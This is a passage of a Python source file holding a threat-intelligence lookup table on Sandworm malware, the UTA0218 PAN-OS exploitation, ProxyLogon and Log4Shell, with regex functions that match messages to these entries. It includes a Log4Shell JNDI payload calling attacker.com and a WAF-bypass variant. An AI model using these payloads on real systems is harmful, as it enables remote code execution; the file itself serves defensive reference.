- T1486 Data Encrypted for Impact (NotPetya fake ransomware)
- T1195.002 Supply Chain Compromise (NotPetya via MeDoc software update; Olympic Destroyer)
- T1059 Command and Scripting Interpreter
- T1566 Phishing (initial access in power grid attacks)
- T1078 Valid Accounts (stolen VPN credentials for OT network access)
- T0800 Activate Firmware Update Mode (INDUSTROYER2 targeting IEC 104 protocol)

MALWARE / TOOLSET:
- NotPetya: wiper masquerading as ransomware; propagated via EternalBlue + Mimikatz credential
  theft + PsExec/WMIC lateral movement; MBR and MFT overwritten; no recovery possible
- INDUSTROYER (CRASHOVERRIDE): modular ICS attack platform; speaks native ICS protocols
  (IEC 101, IEC 104, IEC 61850, OPC DA) to issue substation commands directly
- INDUSTROYER2: hardcoded substation targets; IEC 104 protocol; deployed April 2022
- BlackEnergy 3: backdoor used in 2015 Ukraine attack; VBA macro delivery
- Cyclops Blink: router botnet replacing VPNFilter; targets WatchGuard/Asus devices
- WhisperGate: wiper with fake ransomware note; targeted Ukrainian organisations Jan 2022
- Olympic Destroyer: wiper with 7 stolen legitimate code-signing certificates for false-flag

KEY INDICATORS:
- NotPetya: perfc.dat / perfc DLL in C:\\Windows\\; MBR overwrite within 60 minutes of execution
- INDUSTROYER2: hardcoded IP addresses of substations in binary; IEC 104 STARTDT commands
- Cyclops Blink: router config modification; persistent across firmware updates via flash storage
- Olympic Destroyer: cascading self-deletion; disables Windows boot recovery; steals browser creds
[END THREAT INTEL]""",
    },

    # ── Existing entries below ─────────────────────────────────────────────────
    {
        "names": ["uta0218", "operation midnighteclipse", "midnighteclipse"],
        "keywords": ["upstyle", "cve-2024-3400", "pan-os.*exploit", "globalprotect.*exploit"],
        "facts": """[VERIFIED THREAT INTEL — UTA0218 / Operation MidnightEclipse]
Source: Volexity (April 2024), Palo Alto Unit 42

Actor: UTA0218 (Volexity designation); "Operation MidnightEclipse" (Unit 42)
Assessment: Suspected nation-state threat actor
Active exploitation: March 26, 2024 — weeks before CVE-2024-3400 public disclosure (April 12, 2024)
Vulnerability exploited: CVE-2024-3400 [CRITICAL] CVSS 10.0 — PAN-OS GlobalProtect OS command injection

INITIAL ACCESS:
- Sent crafted HTTP requests to the GlobalProtect portal
- Manipulated the SESSID cookie to inject OS commands via shell metacharacter injection
  in the session file name parser
- No credentials or user interaction required
- Commands executed as root on the host firewall OS

EXECUTION CHAIN:
- Malicious session files created in /var/tmp/ with embedded bash commands
- Triggered by specially crafted SESSID cookie values

UPSTYLE BACKDOOR (custom Python implant):
- Installed at: /usr/lib/python3.6/site-packages/system.pth
- Monitors the nginx error log for encoded commands
- Commands triggered via crafted CSS-style requests containing img[src^= patterns
- Output written to bootstrap.min.css for silent HTTP exfiltration
- Restores original file contents after each execution to evade detection

POST-EXPLOITATION (observed):
- Active Directory credential harvesting via ntdsutil
- Exfiltration of VPN configs, device certificates, session tokens
- Internal lateral movement using stolen credentials
- Persistent reverse shells via cron jobs

INDICATORS OF COMPROMISE:
- /tmp/lmlog
- /usr/lib/python3.6/site-packages/system.pth
- Unusual SESSID cookie formats in GlobalProtect access logs
- Unexpected outbound connections from the firewall management IP

REMEDIATION:
- Apply patches: PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3
- Enable Threat Prevention Threat IDs 95187, 95189, 95191 on GlobalProtect interface
- Disabling device telemetry is NOT sufficient (Palo Alto retracted this workaround)
[END THREAT INTEL]""",
    },
    {
        "names": ["proxylogon", "hafnium"],
        "keywords": ["cve-2021-26855.*exploit", "exchange.*exploit.*2021"],
        "facts": """[VERIFIED THREAT INTEL — ProxyLogon / HAFNIUM]
Source: Microsoft MSRC, Volexity (March 2021)

Actor: HAFNIUM (Microsoft designation) — suspected Chinese state-sponsored group
Vulnerability chain: CVE-2021-26855 (SSRF) + CVE-2021-27065 (arbitrary file write) → RCE
Active exploitation: January 2021 — before public disclosure (March 2, 2021)

ATTACK CHAIN:
1. CVE-2021-26855: Pre-auth SSRF bypasses Exchange authentication
2. CVE-2021-27065: Authenticated arbitrary file write via ECP endpoint
3. Web shell dropped to accessible path (e.g., /owa/auth/*.aspx)
4. RCE as SYSTEM via web shell

POST-EXPLOITATION:
- Credential dumping via LSASS / Procdump
- Exchange mailbox exfiltration
- Cobalt Strike beacon deployment for persistence

REMEDIATION:
- Apply March 2021 Security Update (KB5000871) immediately
- Hunt for web shells in /owa/auth/ and /aspnet_client/
- Review IIS logs for anomalous ECP requests
[END THREAT INTEL]""",
    },
    {
        "names": ["log4shell.*exploit", "log4j.*threat actor"],
        "keywords": ["cve-2021-44228.*actor", "jndi.*exploit.*campaign"],
        "facts": """[VERIFIED THREAT INTEL — Log4Shell Exploitation Campaigns]
Source: CISA AA21-356A, Mandiant, CrowdStrike (December 2021)

CVE-2021-44228 [CRITICAL] CVSS 10.0 — Apache Log4j2 JNDI RCE

THREAT ACTORS EXPLOITING LOG4SHELL:
- Nation-state: APT41 (China), Charming Kitten (Iran), Sandworm (Russia)
- Ransomware groups: Conti, LockBit, others
- Cryptomining botnets (Kinsing, XMRig variants)

COMMON ATTACK PATTERN:
- Payload in user-controlled fields: HTTP headers (User-Agent, X-Forwarded-For),
  usernames, form inputs, log messages
- JNDI callback: ${jndi:ldap://attacker.com/exploit}
- Variants bypassing WAF filters: ${${::-j}${::-n}${::-d}${::-i}:...}

REMEDIATION:
- Upgrade to Log4j2 2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6)
- JVM flag: -Dlog4j2.formatMsgNoLookups=true (partial, not sufficient alone)
- Block outbound LDAP (TCP 389) and RMI (TCP 1099) from app servers
[END THREAT INTEL]""",
    },
]


def _matches(text: str, entry: dict) -> bool:
    t = text.lower()
    for name in entry["names"]:
        if re.search(name, t):
            return True
    for kw in entry["keywords"]:
        if re.search(kw, t):
            return True
    return False


def build_threat_intel_context(message: str) -> str:
    """Return verified threat intel blocks for any known actors/campaigns in the message."""
    blocks = []
    for entry in THREAT_INTEL_DB:
        if _matches(message, entry):
            blocks.append(entry["facts"])
    return "\n\n".join(blocks)
